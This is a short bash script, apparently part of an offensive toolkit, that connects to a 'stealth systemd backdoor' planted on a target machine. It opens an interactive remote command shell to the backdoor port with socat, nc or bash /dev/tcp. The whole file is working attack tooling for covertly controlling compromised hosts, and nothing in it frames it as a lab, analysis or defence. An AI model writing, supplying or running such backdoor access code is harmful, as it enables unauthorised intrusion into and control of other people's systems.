#!/bin/bash
# connect.sh — Connect to the stealth systemd backdoor listener
# Usage: ./connect.sh <target-ip> [port]
# Default port: 1 (the port configured in init.socket)

TARGET="${1:-}"
PORT="${2:-1}"

if [[ -z "$TARGET" ]]; then
    echo "Usage: $0 <target-ip> [port]"
    echo "Connects to the stealth systemd socket backdoor on TCP port ${PORT}"
    exit 1
fi

echo "[*] Connecting to ${TARGET}:${PORT}..."
echo "[*] Type commands, receive output. Press Ctrl+C to exit."
echo ""

# Use socat if available (better interactive shell), fallback to nc
if command -v socat &>/dev/null; then
    socat "stdio" "tcp:${TARGET}:${PORT}"
elif command -v nc &>/dev/null; then
    # -q 0: quit on EOF (socat compat)
    nc -q 0 "${TARGET}" "${PORT}"
else
    # Pure bash /dev/tcp (no external tools needed)
    exec 3<>"/dev/tcp/${TARGET}/${PORT}"
    cat <&3 &
    cat >&3
fi